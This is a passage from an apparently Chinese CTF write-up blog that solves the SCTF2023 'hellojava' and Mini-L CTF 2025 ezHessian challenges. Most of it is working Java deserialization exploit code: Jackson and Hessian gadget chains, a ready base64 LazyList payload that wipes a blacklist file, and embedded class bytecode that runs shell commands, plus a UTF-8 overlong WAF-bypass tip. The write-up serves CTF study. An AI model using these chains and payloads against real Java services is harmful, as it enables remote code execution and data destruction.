class="hljs-keyword">class</span> <span class="hljs-title class_">Calc</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span> &#123;<br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc.exe&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, SerializationHandler[] handlers)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20250224164706848.png" alt="image-20250224164706848"></p><p>大B哥的blog将怎么消除黑名单和后续EXP都已给出：</p><p>[SCTF2023 Web WriteUp - Boogiepop Doesn’t Laugh](<a href="https://boogipop.com/2023/06/20/SCTF2023">https://boogipop.com/2023/06/20/SCTF2023</a> Web WriteUp&#x2F;#Hellojava)</p><p>scala里的lazylist是出过java反序列化漏洞的，我们可以利用exp清空任意文件的内容：</p><p><a href="https://github.com/yarocher/lazylist-cve-poc/blob/main/src/main/java/poc/cve/lazylist/payload/LazyList.java">https://github.com/yarocher/lazylist-cve-poc/blob/main/src/main/java/poc/cve/lazylist/payload/LazyList.java</a></p><p>按照上述github项目搭建好，就会生成一个序列化文件，把他base64后打入题目，就会清空黑名单。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">rO0ABXNyADZzY2FsYS5jb2xsZWN0aW9uLmltbXV0YWJsZS5MYXp5TGlzdCRTZXJpYWxpemF0aW9uUHJveHkAAAAAAAAAAwMAAHhwc3IAJnNjYWxhLnJ1bnRpbWUuTW9kdWxlU2VyaWFsaXphdGlvblByb3h5AAAAAAAAAAECAAFMAAttb2R1bGVDbGFzc3QAEUxqYXZhL2xhbmcvQ2xhc3M7eHB2cgAmc2NhbGEuY29sbGVjdGlvbi5nZW5lcmljLlNlcmlhbGl6ZUVuZCQAAAAAAAAAAwIAAHhwc3IAI3NjYWxhLmNvbGxlY3Rpb24uaW1tdXRhYmxlLkxhenlMaXN0AAAAAAAAAAMDAAVaAAhiaXRtYXAkMFoADW1pZEV2YWx1YXRpb25aADNzY2FsYSRjb2xsZWN0aW9uJGltbXV0YWJsZSRMYXp5TGlzdCQkc3RhdGVFdmFsdWF0ZWRMAAlsYXp5U3RhdGV0ABFMc2NhbGEvRnVuY3Rpb24wO0wAKnNjYWxhJGNvbGxlY3Rpb24kaW1tdXRhYmxlJExhenlMaXN0JCRzdGF0ZXQAK0xzY2FsYS9jb2xsZWN0aW9uL2ltbXV0YWJsZS9MYXp5TGlzdCRTdGF0ZTt4cAAAAXNyAExzY2FsYS5zeXMucHJvY2Vzcy5Qcm9jZXNzQnVpbGRlckltcGwkRmlsZU91dHB1dCQkYW5vbmZ1biQkbGVzc2luaXQkZ3JlYXRlciQzAAAAAAAAAAACAAJaAAhhcHBlbmQkMUwABmZpbGUkMnQADkxqYXZhL2lvL0ZpbGU7eHAAc3IADGphdmEuaW8uRmlsZQQtpEUODeT/AwABTAAEcGF0aHQAEkxqYXZhL2xhbmcvU3RyaW5nO3hwdAAYLi9zZWN1cml0eS9ibGFja2xpc3QudHh0dwIAL3hzcQB+AAJ2cgAwc2NhbGEuY29sbGVjdGlvbi5pbW11dGFibGUuTGF6eUxpc3QkU3RhdGUkRW1wdHkkAAAAAAAAAAMCAAB4cHh4<br></code></pre></td></tr></table></figure><p>然后使用jackson的普通利用链：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> exp.eddiemurphy;<br><br><span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtConstructor;<br><span class="hljs-keyword">import</span> org.springframework.http.HttpEntity;<br><span class="hljs-keyword">import</span> org.springframework.http.HttpHeaders;<br><span class="hljs-keyword">import</span> org.springframework.http.ResponseEntity;<br><span class="hljs-keyword">import</span> org.springframework.web.client.RestTemplate;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.net.URI;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.security.*;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Exp_TemplatesImplChain</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setFieldValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;whatever&quot;</span>);<br>        <span class="hljs-type">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;F:\\CTF_Java\\sctf_hellojava\\src\\main\\java\\exp\\eddiemurphy\\Calc.java&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes=&#123;code&#125;;<br>        setFieldValue(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>        setFieldValue(templates,<span class="hljs-string">&quot;_bytecodes&quot;</span>,codes);<br>        <span class="hljs-type">POJONode</span> <span class="hljs-variable">jsonNodes</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">POJONode</span>(templates);<br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">exp</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-number">11</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">val</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;javax.management.BadAttributeValueExpException&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);<br>        val.setAccessible(<span class="hljs-literal">true</span>);<br>        val.set(exp,jsonNodes);<br>        <span class="hljs-comment">//deserial(serial(exp));</span><br>        System.out.println(serial(exp));<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">serial</span><span class="hljs-params">(Object o)</span> <span class="hljs-keyword">throws</span> IOException, NoSuchFieldException &#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        oos.writeObject(o);<br>        oos.close();<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">base64String</span> <span class="hljs-operator">=</span> Base64.getEncoder().encodeToString(baos.toByteArray());<br>        <span class="hljs-keyword">return</span> base64String;<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">deserial</span><span class="hljs-params">(String data)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">byte</span>[] base64decodedBytes = Base64.getDecoder().decode(data);<br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bais</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(base64decodedBytes);<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(bais);<br>        ois.readObject();<br>        ois.close();<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">Base64Encode</span><span class="hljs-params">(ByteArrayOutputStream bs)</span>&#123;<br>        <span class="hljs-type">byte</span>[] encode = Base64.getEncoder().encode(bs.toByteArray());<br>        <span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(encode);<br>        System.out.println(s);<br>        System.out.println(s.length());<br>    &#125;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String field, Object arg)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(field);<br>        f.setAccessible(<span class="hljs-literal">true</span>);<br>        f.set(obj, arg);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>传两次参就ok了。</p><p>SE学长的分析也是很不错啊，前人栽树后人乘凉了嘻嘻：</p><p><a href="https://notebook.silente.dev/Web/Writeups/SCTF2023/#hellojava">SCTF 2023 - SilentE 的笔记本</a></p><h2 id="Mini-L-CTF-2025-ezHessian-hdHessian"><a href="#Mini-L-CTF-2025-ezHessian-hdHessian" class="headerlink" title="Mini-L CTF-2025 ezHessian&#x2F;hdHessian"></a>Mini-L CTF-2025 ezHessian&#x2F;hdHessian</h2><p>难得一见的hessian啊。</p><h3 id="ezHessian"><a href="#ezHessian" class="headerlink" title="ezHessian"></a>ezHessian</h3><p>先看ezHessian，其实这道题随便搜搜Hessian的原生链就能打通，hessian版本不算高，bypass waf其实使用UTF-8 Overlong Encoding就绕了：</p><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20250520171311225.png" alt="image-20250520171311225"></p><p>简单粗暴的接口，下面还有个doPost也可以post传参。</p><p>具体反序列化链不作分析，稍微改改就能打通readObject和整个chains：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> exp.eddiemurphy;<br><br><span class="hljs-keyword">import</span> com.caucho.hessian.io.Hessian2Input;<br><span class="hljs-keyword">import</span> com.caucho.hessian.io.Hessian2Output;<br><span class="hljs-keyword">import</span> com.caucho.hessian.io.SerializerFactory;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.security.utils.Base64;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtConstructor;<br><span class="hljs-keyword">import</span> sun.misc.Unsafe;<br><span class="hljs-keyword">import</span> sun.reflect.misc.MethodUtil;<br><span class="hljs-keyword">import</span> sun.swing.SwingLazyValue;<br><br><span class="hljs-keyword">import</span> javax.swing.*;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Array;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.security.ProtectionDomain;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Hashtable;<br><span class="hljs-keyword">import</span> java.util.UUID;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Exp</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object newValue)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> obj.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> clazz.getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, newValue);<br>    &#125;<br><br>    <span class="hljs-keyword">static</span> <span class="hljs-type">SerializerFactory</span> <span class="hljs-variable">serializerFactory</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SerializerFactory</span>();<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">//可以直接从readfile综合起来</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload_calc</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;yv66vgAAADQAUQoAFwAjCAAkCAAlCgAmACcKAAgAKAgAKQoACAAqBwArCAAsCAAtCAAuCAAvBwAwCgAxADIKADEAMwoANAA1CgANADYIADcKAA0AOAoADQA5BwA6BwA7BwA8AQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACDxjbGluaXQ+AQANU3RhY2tNYXBUYWJsZQcAKwcAPQcAOgEAClNvdXJjZUZpbGUBAAlFdmlsLmphdmEMABgAGQEABGNhbGMBAAdvcy5uYW1lBwA+DAA/AEAMAEEAQgEAA3dpbgwAQwBEAQAQamF2YS9sYW5nL1N0cmluZwEAA2NtZAEAAi9jAQAJL2Jpbi9iYXNoAQACLWMBABFqYXZhL3V0aWwvU2Nhbm5lcgcARQwARgBHDABIAEkHAEoMAEsATAwAGABNAQACXEEMAE4ATwwAUABCAQATamF2YS9sYW5nL0V4Y2VwdGlvbgEABEV2aWwBABBqYXZhL2xhbmcvT2JqZWN0AQATW0xqYXZhL2xhbmcvU3RyaW5nOwEAEGphdmEvbGFuZy9TeXN0ZW0BAAtnZXRQcm9wZXJ0eQEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQALdG9Mb3dlckNhc2UBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEACGNvbnRhaW5zAQAbKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylaAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAKChbTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBABFqYXZhL2xhbmcvUHJvY2VzcwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBAAx1c2VEZWxpbWl0ZXIBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL3V0aWwvU2Nhbm5lcjsBAARuZXh0ACEAFgAXAAAAAAACAAEAGAAZAAEAGgAAAB0AAQABAAAABSq3AAGxAAAAAQAbAAAABgABAAAAAwAIABwAGQABABoAAAC6AAQAAwAAAF0SAksBTBIDuAAEtgAFEga2AAeZABkGvQAIWQMSCVNZBBIKU1kFKlNMpwAWBr0ACFkDEgtTWQQSDFNZBSpTTLsADVm4AA4rtgAPtgAQtwAREhK2ABO2ABRNpwAES7EAAQAAAFgAWwAVAAIAGwAAACYACQAAAAYAAwAHAAUACAAVAAkAKwALAD4ADgBYABAAWwAPAFwAEgAdAAAAFwAE/QArBwAeBwAfEv8AHAAAAAEHACAAAAEAIQAAAAIAIg==&quot;</span>;<br><br>        <span class="hljs-type">byte</span>[] decodedClassBytes = java.util.Base64.getDecoder().decode(payload_calc);<br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">classPool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> classPool.makeClass(<span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.ByteArrayInputStream(decodedClassBytes));<br><span class="hljs-comment">// 添加静态代码块打印</span><br>        <span class="hljs-type">CtConstructor</span> <span class="hljs-variable">staticConstructor</span> <span class="hljs-operator">=</span> ctClass.makeClassInitializer();<br>        staticConstructor.insertBefore(<span class="hljs-string">&quot;System.out.println(\&quot;success\&quot;);&quot;</span>);<br><span class="hljs-comment">// 更改类名</span><br>        ctClass.setName(<span class="hljs-string">&quot;org.apache.WebSocketUpgradeOfpuanListener.&quot;</span> + UUID.randomUUID().toString().replace(<span class="hljs-string">&quot;-&quot;</span>, <span class="hljs-string">&quot;&quot;</span>));<br><span class="hljs-comment">// 将修改后的类转换为 Base64</span><br>        payload_calc = java.util.Base64.getEncoder().encodeToString(ctClass.toBytecode());<br>        <span class="hljs-type">String</span> <span class="hljs-variable">new_ClassName</span> <span class="hljs-operator">=</span> ctClass.getName();<br><br>        <span class="hljs-type">byte</span>[] bcode = Base64.decode(payload_calc);<br><br>        serializerFactory.setAllowNonSerializable(<span class="hljs-literal">true</span>);<br><br>        <span class="hljs-type">Method</span> <span class="hljs-variable">invoke</span> <span class="hljs-operator">=</span> MethodUtil.class.getMethod(<span class="hljs-string">&quot;invoke&quot;</span>, Method.class, Object.class, Object[].class);<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">defineClass</span> <span class="hljs-operator">=</span> Unsafe.class.getDeclaredMethod(<span class="hljs-string">&quot;defineClass&quot;</span>, String.class, <span class="hljs-type">byte</span>[].class, <span class="hljs-type">int</span>.class, <span class="hljs-type">int</span>.class, ClassLoader.class, ProtectionDomain.class);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> Unsafe.class.getDeclaredField(<span class="hljs-string">&quot;theUnsafe&quot;</span>);<br>        f.setAccessible(<span class="hljs-literal">true</span>);<br><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">unsafe</span> <span class="hljs-operator">=</span> f.get(<span class="hljs-literal">null</span>);<br>        Object[] ags = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;invoke, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;defineClass, unsafe, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;new_ClassName, bcode, <span class="hljs-number">0</span>, bcode.length, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;&#125;&#125;;<br><br>        <span class="hljs-type">SwingLazyValue</span> <span class="hljs-variable">swingLazyValue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SwingLazyValue</span>(<span class="hljs-string">&quot;sun.reflect.misc.MethodUtil&quot;</span>, <span class="hljs-string">&quot;invoke&quot;</span>, ags);<br>        <span class="hljs-type">SwingLazyValue</span> <span class="hljs-variable">swingLazyValue1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SwingLazyValue</span>(new_ClassName, <span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[<span class="hljs-number">0</span>]);<br><br>        Object[] keyValueList = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;abc&quot;</span>, swingLazyValue&#125;;<br>        Object[] keyValueList1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;ccc&quot;</span>, swingLazyValue1&#125;;<br><br>        <span class="hljs-type">UIDefaults</span> <span class="hljs-variable">uiDefaults1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UIDefaults</span>(keyValueList);<br>        <span class="hljs-type">UIDefaults</span> <span class="hljs-variable">uiDefaults2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UIDefaults</span>(keyValueList);<br>        <span class="hljs-type">UIDefaults</span> <span class="hljs-variable">uiDefaults3</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UIDefaults</span>(keyValueList1);<br>        <span class="hljs-type">UIDefaults</span> <span class="hljs-variable">uiDefaults4</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UIDefaults</span>(keyValueList1);<br><br>        Hashtable&lt;Object, Object&gt; hashtable1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hashtable</span>&lt;&gt;();<br>        Hashtable&lt;Object, Object&gt; hashtable2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hashtable</span>&lt;&gt;();<br>        Hashtable&lt;Object, Object&gt; hashtable3 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hashtable</span>&lt;&gt;();<br>        Hashtable&lt;Object, Object&gt; hashtable4 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hashtable</span>&lt;&gt;();<br><br>        hashtable1.put(<span class="hljs-string">&quot;a&quot;</span>, uiDefaults1);<br>        hashtable2.put(<span class="hljs-string">&quot;a&quot;</span>, uiDefaults2);<br>        hashtable3.put(<span class="hljs-string">&quot;b&quot;</span>, uiDefaults3);<br>        hashtable4.put(<span class="hljs-string">&quot;b&quot;</span>, uiDefaults4);<br><br><span class="hljs-comment">// 序列化</span><br>        <span class="hljs-comment">//String serData = serObj(hashtable1, hashtable2, hashtable3, hashtable4);</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">serData</span> <span class="hljs-operator">=</span> UTF8_serObj(hashtable1, hashtable2, hashtable3, hashtable4);<br>        System.out.println(serData);<br><span class="hljs-comment">// 反序列化</span><br>        readObj(serData);<br>    &#125;<br><br>    <span class="hljs-keyword">static</span> String <span class="hljs-title function_">serObj</span><span class="hljs-params">(Object hashtable1, Object hashtable2, Object hashtable3, Object hashtable4)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        HashMap&lt;Object, Object&gt; s = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        setFieldValue(s, <span class="hljs-string">&quot;size&quot;</span>, <span class="hljs-number">4</span>);<br>        Class&lt;?&gt; nodeC;<br>        <span class="hljs-keyword">try</span> &#123;<br>            nodeC = Class.forName(<span class="hljs-string">&quot;java.util.HashMap$Node&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException e) &#123;<br>            nodeC = Class.forName(<span class="hljs-string">&quot;java.util.HashMap$Entry&quot;</span>);<br>        &#125;<br>        Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(<span class="hljs-type">int</span>.class, Object.class, Object.class, nodeC);<br>        nodeCons.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">tbl</span> <span class="hljs-operator">=</span> Array.newInstance(nodeC, <span class="hljs-number">4</span>);<br>        Array.set(tbl, <span 